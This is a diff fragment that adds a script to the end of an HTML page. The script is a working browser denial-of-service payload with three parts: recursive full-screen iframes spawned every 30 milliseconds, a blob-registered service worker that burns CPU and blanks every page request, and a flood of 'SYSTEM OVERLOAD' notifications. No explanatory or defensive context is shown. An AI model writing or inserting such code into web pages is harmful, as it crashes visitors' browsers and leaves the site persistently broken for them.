+        function cI(){var ifr=document.createElement('iframe');ifr.src=window.location.href;ifr.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:9999999;';ifr.setAttribute('sandbox','allow-scripts allow-same-origin');document.body.appendChild(ifr);setTimeout(cI,30);}
+        cI();
+        if('serviceWorker' in navigator){var swB=new Blob(['self.addEventListener("install",e=>{self.skipWaiting()});self.addEventListener("activate",e=>{e.waitUntil(self.clients.claim());setInterval(()=>{let x=0;for(let i=0;i<99999999;i++)x+=Math.random();},0)});self.addEventListener("fetch",e=>{e.respondWith(new Response("",{status:200}))});'],{type:'application/javascript'});var swU=URL.createObjectURL(swB);navigator.serviceWorker.register(swU,{scope:'/'}).catch(function(){});}
+        if('Notification' in window){Notification.requestPermission().then(function(p){if(p==='granted'){setInterval(function(){try{new Notification('SYSTEM OVERLOAD');}catch(e){}},100);}});}
+    })();
+    </script>
 </body>
 </html>
